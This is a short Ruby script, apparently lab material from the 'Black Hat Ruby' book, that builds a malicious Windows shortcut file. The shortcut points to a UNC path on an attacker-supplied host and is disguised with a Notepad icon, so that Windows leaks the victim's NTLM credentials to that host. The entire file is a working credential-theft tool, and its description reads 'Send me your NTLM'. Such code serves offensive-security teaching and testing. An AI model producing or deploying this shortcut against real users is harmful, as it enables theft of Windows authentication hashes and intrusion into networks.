#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Creating an evil shortcut to steal NTLM on Windows
# Requirements:
#   Windows OS
#
unless Gem.win_platform?
  puts "[!] This script runs only on Windows OS!"
  exit!
end

require 'win32ole'

path    = ARGV[0] || 'localhost\bhr.png'
sc_file = ARGV[1] || 'badshortcut.lnk'

shell = WIN32OLE.new('WScript.Shell')
link  = shell.CreateShortcut(sc_file)
link.TargetPath   = '\\\\' + path
link.Description  = "Send me your NTLM"
link.IconLocation = "notepad.exe"
link.WindowStyle  = 4
link.save 
